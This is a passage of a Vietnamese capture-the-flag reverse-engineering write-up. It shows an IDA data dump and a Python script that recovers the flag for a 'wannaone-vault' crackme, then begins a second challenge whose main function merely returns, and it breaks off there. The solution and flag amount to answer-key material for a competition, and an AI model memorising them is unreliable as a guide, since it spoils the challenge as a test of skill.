</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span><span style="color:#ae81ff">8</span>B                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span><span style="color:#ae81ff">8</span>C                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span><span style="color:#ae81ff">8</span>D                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span><span style="color:#ae81ff">8</span>E                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">000000000000208F</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span><span style="color:#ae81ff">90</span>                 db  <span style="color:#ae81ff">2</span>Eh ; .
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span><span style="color:#ae81ff">91</span>                 db  <span style="color:#ae81ff">70</span>h ; p
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span><span style="color:#ae81ff">92</span>                 db  <span style="color:#ae81ff">3</span>Eh ; <span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span><span style="color:#ae81ff">93</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span><span style="color:#ae81ff">94</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span><span style="color:#ae81ff">95</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span><span style="color:#ae81ff">96</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span><span style="color:#ae81ff">97</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span><span style="color:#ae81ff">98</span>                 db  <span style="color:#ae81ff">7F</span>h ; <span style="color:#960050;background-color:#1e0010"></span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span><span style="color:#ae81ff">99</span>                 db  <span style="color:#ae81ff">20</span>h
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span><span style="color:#ae81ff">9</span>A                 db  <span style="color:#ae81ff">61</span>h ; a
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span><span style="color:#ae81ff">9</span>B                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span><span style="color:#ae81ff">9</span>C                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span><span style="color:#ae81ff">9</span>D                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span><span style="color:#ae81ff">9</span>E                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">000000000000209F</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>A0                 db  <span style="color:#ae81ff">30</span>h ; <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>A1                 db  <span style="color:#ae81ff">70</span>h ; p
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>A2                 db  <span style="color:#ae81ff">4F</span>h ; O
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>A3                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>A4                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>A5                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>A6                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>A7                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>A8                 db  <span style="color:#ae81ff">61</span>h ; a
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>A9                 db  <span style="color:#ae81ff">20</span>h
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>AA                 db  <span style="color:#ae81ff">67</span>h ; g
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>AB                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>AC                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>AD                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>AE                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>AF                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>B0                 db  <span style="color:#ae81ff">32</span>h ; <span style="color:#ae81ff">2</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>B1                 db  <span style="color:#ae81ff">70</span>h ; p
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>B2                 db  <span style="color:#ae81ff">73</span>h ; s
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>B3                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>B4                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>B5                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>B6                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>B7                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>B8                 db  <span style="color:#ae81ff">63</span>h ; c
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>B9                 db  <span style="color:#ae81ff">20</span>h
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>BA                 db  <span style="color:#ae81ff">66</span>h ; f
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>BB                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>BC                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>BD                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>BE                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>BF                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>C0                 db  <span style="color:#ae81ff">34</span>h ; <span style="color:#ae81ff">4</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>C1                 db  <span style="color:#ae81ff">70</span>h ; p
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>C2                 db  <span style="color:#ae81ff">78</span>h ; x
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>C3                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>C4                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>C5                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>C6                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>C7                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>C8                 db  <span style="color:#ae81ff">65</span>h ; e
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>C9                 db  <span style="color:#ae81ff">20</span>h
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>CA                 db  <span style="color:#ae81ff">61</span>h ; a
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>CB                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>CC                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>CD                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>CE                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>CF                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>D0                 db  <span style="color:#ae81ff">36</span>h ; <span style="color:#ae81ff">6</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>D1                 db  <span style="color:#ae81ff">70</span>h ; p
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>D2                 db  <span style="color:#ae81ff">49</span>h ; I
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>D3                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>D4                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>D5                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>D6                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>D7                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>D8                 db  <span style="color:#ae81ff">67</span>h ; g
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>D9                 db  <span style="color:#ae81ff">20</span>h
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>DA                 db  <span style="color:#ae81ff">70</span>h ; p
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>DB                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>DC                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>DD                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>DE                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>DF                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020E0</span>                 db  <span style="color:#ae81ff">38</span>h ; <span style="color:#ae81ff">8</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020E1</span>                 db  <span style="color:#ae81ff">70</span>h ; p
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020E2</span>                 db  <span style="color:#ae81ff">77</span>h ; w
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020E3</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020E4</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020E5</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020E6</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020E7</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020E8</span>                 db  <span style="color:#ae81ff">69</span>h ; i
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020E9</span>                 db  <span style="color:#ae81ff">20</span>h
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>EA                 db  <span style="color:#ae81ff">76</span>h ; v
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>EB                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>EC                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>ED                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>EE                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>EF                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020F</span><span style="color:#ae81ff">0</span>                 db  <span style="color:#ae81ff">3</span>Ah ; <span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020F</span><span style="color:#ae81ff">1</span>                 db  <span style="color:#ae81ff">70</span>h ; p
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020F</span><span style="color:#ae81ff">2</span>                 db  <span style="color:#ae81ff">7</span>Eh ; <span style="color:#f92672">~</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020F</span><span style="color:#ae81ff">3</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020F</span><span style="color:#ae81ff">4</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020F</span><span style="color:#ae81ff">5</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020F</span><span style="color:#ae81ff">6</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020F</span><span style="color:#ae81ff">7</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020F</span><span style="color:#ae81ff">8</span>                 db  <span style="color:#ae81ff">6</span>Bh ; k
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020F</span><span style="color:#ae81ff">9</span>                 db  <span style="color:#ae81ff">20</span>h
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020F</span>A                 db  <span style="color:#ae81ff">44</span>h ; D
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020F</span>B                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020F</span>C                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020F</span>D                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020F</span>E                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020FF</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">0000000000002100</span>                 db  <span style="color:#ae81ff">3</span>Ch ; <span style="color:#f92672">&lt;</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">0000000000002101</span>                 db  <span style="color:#ae81ff">70</span>h ; p
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">0000000000002102</span>                 db  <span style="color:#ae81ff">76</span>h ; v
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">0000000000002103</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">0000000000002104</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">0000000000002105</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">0000000000002106</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">0000000000002107</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">000000000000210</span><span style="color:#ae81ff">8</span>                 db  <span style="color:#ae81ff">6</span>Dh ; m
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">000000000000210</span><span style="color:#ae81ff">9</span>                 db  <span style="color:#ae81ff">20</span>h
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">000000000000210</span>A                 db  <span style="color:#ae81ff">2</span>Dh ; <span style="color:#f92672">-</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">000000000000210</span>B                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">000000000000210</span>C                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">000000000000210</span>D                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">000000000000210</span>E                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">000000000000210F</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">0000000000002110</span>                 db  <span style="color:#ae81ff">3</span>Eh ; <span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">0000000000002111</span>                 db  <span style="color:#ae81ff">70</span>h ; p
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">0000000000002112</span>                 db  <span style="color:#ae81ff">7</span>Ch ; <span style="color:#f92672">|</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">0000000000002113</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">0000000000002114</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">0000000000002115</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">0000000000002116</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">0000000000002117</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">000000000000211</span><span style="color:#ae81ff">8</span>                 db  <span style="color:#ae81ff">6F</span>h ; o
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">000000000000211</span><span style="color:#ae81ff">9</span>                 db  <span style="color:#ae81ff">20</span>h
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">000000000000211</span>A                 db  <span style="color:#ae81ff">62</span>h ; b
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">000000000000211</span>B                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">000000000000211</span>C                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">000000000000211</span>D                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">000000000000211</span>E                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">000000000000211F</span>                 db    <span style="color:#ae81ff">0</span>  
</span></span></code></pre></div><p>Mọi thứ đã rõ ràng, dưới đây là script cho bài toán này:</p>
<p><a href="https://github.com/w1n-gl0ry/CTF/blob/main/2023/miniCTF/rev/wannaone-vault/vault.py">vault.py</a></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> base64
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>num <span style="color:#f92672">=</span> [<span style="color:#ae81ff">0x577020</span>,<span style="color:#ae81ff">0x302071</span>,<span style="color:#ae81ff">0x797022</span>,<span style="color:#ae81ff">0x612073</span>,<span style="color:#ae81ff">0x357024</span>,<span style="color:#ae81ff">0x712075</span>,<span style="color:#ae81ff">0x597026</span>,<span style="color:#ae81ff">0x372077</span>,<span style="color:#ae81ff">0x787028</span>,<span style="color:#ae81ff">0x3a2079</span>,<span style="color:#ae81ff">0x78702a</span>,<span style="color:#ae81ff">0x6a207b</span>,<span style="color:#ae81ff">0x78702c</span>,<span style="color:#ae81ff">0x3c207d</span>,<span style="color:#ae81ff">0x3e702e</span>,<span style="color:#ae81ff">0x61207f</span>,<span style="color:#ae81ff">0x4f7030</span>,<span style="color:#ae81ff">0x672061</span>,<span style="color:#ae81ff">0x737032</span>,<span style="color:#ae81ff">0x662063</span>,<span style="color:#ae81ff">0x787034</span>,<span style="color:#ae81ff">0x612065</span>,<span style="color:#ae81ff">0x497036</span>,<span style="color:#ae81ff">0x702067</span>,<span style="color:#ae81ff">0x777038</span>,<span style="color:#ae81ff">0x762069</span>,<span style="color:#ae81ff">0x7e703a</span>,<span style="color:#ae81ff">0x44206b</span>,<span style="color:#ae81ff">0x76703c</span>,<span style="color:#ae81ff">0x2d206d</span>,<span style="color:#ae81ff">0x7c703e</span>,<span style="color:#ae81ff">0x62206f</span>]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>flag <span style="color:#f92672">=</span> []
</span></span><span style="display:flex;"><span>idx <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> key <span style="color:#f92672">in</span> num:
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> idx <span style="color:#f92672">%</span> <span style="color:#ae81ff">2</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">256</span>):
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (((((x <span style="color:#f92672">^</span> idx) <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">0x10</span>) <span style="color:#f92672">^</span> <span style="color:#ae81ff">0x7020</span>) <span style="color:#f92672">^</span> idx) <span style="color:#f92672">==</span> key):
</span></span><span style="display:flex;"><span>                flag<span style="color:#f92672">.</span>append(x)
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">break</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> y <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">256</span>):
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (((((y <span style="color:#f92672">^</span> idx) <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">0x10</span>) <span style="color:#f92672">^</span> <span style="color:#ae81ff">0x2070</span>) <span style="color:#f92672">^</span> idx) <span style="color:#f92672">==</span> key):
</span></span><span style="display:flex;"><span>                flag<span style="color:#f92672">.</span>append(y)
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">break</span>
</span></span><span style="display:flex;"><span>    idx <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>join(chr(i) <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> flag))
</span></span></code></pre></div><p>-&gt; <code>FLAG: W1{b1t_0p3rat10n_vault_good_j0b}</code></p>
<h3 id="3-wanna-one-intels">3. wanna-one intels</h3>
<p><code>Description: Wait what? The intel is empty?????</code></p>
<p><code>Chall file:</code> <a href="https://github.com/w1n-gl0ry/CTF/blob/main/2023/miniCTF/rev/wannaone-intels/wanna-one-intels">wanna-one-intels</a></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">╭─</span> <span style="color:#960050;background-color:#1e0010"></span> <span style="color:#960050;background-color:#1e0010"></span> <span style="color:#f92672">~/</span>CTF<span style="color:#f92672">/</span>wannagame<span style="color:#f92672">/</span>chall                                                          <span style="color:#960050;background-color:#1e0010"></span> <span style="color:#ae81ff">18</span><span style="color:#f92672">:</span><span style="color:#ae81ff">50</span><span style="color:#f92672">:</span><span style="color:#ae81ff">01</span> <span style="color:#960050;background-color:#1e0010">─╮</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">╰─❯</span> file wanna<span style="color:#f92672">-</span>one<span style="color:#f92672">-</span>intels                                                                        <span style="color:#960050;background-color:#1e0010">─╯</span>
</span></span><span style="display:flex;"><span>wanna<span style="color:#f92672">-</span>one<span style="color:#f92672">-</span>intels: ELF <span style="color:#ae81ff">64</span><span style="color:#f92672">-</span>bit LSB executable, x86<span style="color:#f92672">-</span><span style="color:#ae81ff">64</span>, version <span style="color:#ae81ff">1</span> (GNU<span style="color:#f92672">/</span>Linux), statically linked, BuildID[sha1]<span style="color:#f92672">=</span><span style="color:#ae81ff">4</span>d076f0b0fa3a59f76928ddb65212898859409ff, <span style="color:#66d9ef">for</span> GNU<span style="color:#f92672">/</span>Linux <span style="color:#ae81ff">3.2.0</span>, not stripped
</span></span></code></pre></div><p>Vẫn là 1 file ELF 64bit (không bị stripped), nhưng lúc mình kiểm tra hàm main, thì nó chỉ thực hiện return ??
Vậy thì chương trình giấu số code còn lại ở đâu ????</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>.text:<span style="color:#ae81ff">0000000000401620</span> ; <span style="color:#66d9ef">int</span> <span style="color:#66d9ef">__cdecl</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>argv, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>envp)
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">0000000000401620</span>                 public main
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">0000000000401620</span> main            proc near               ; DATA XREF: _start<span style="color:#f92672">+</span><span style="color:#ae81ff">18</span><span style="color:#960050;background-color:#1e0010">↓</span>o
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">0000000000401620</span> ; __unwind {
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">0000000000401620</span>                 endbr64
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">0000000000401624</span>                 xor     eax, eax
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">0000000000401626</span>                 retn
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">0000000000401626</span> ; } <span style="color:#75715e">// starts at 401620
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>.text:<span style="color:#ae81ff">0000000000401626</span> main            endp
</span></span></code></pre></div><p>Ban đầu, mình thấy hơi hoang mang, và vì đây là file binary dùng <code>statically linked</code>, nên mình khá lười trong việc tìm xem hàm nào ẩn giấu trong IDA</p>
<p>Nên mình quyết định chạy file và có kết quả sau:</p>
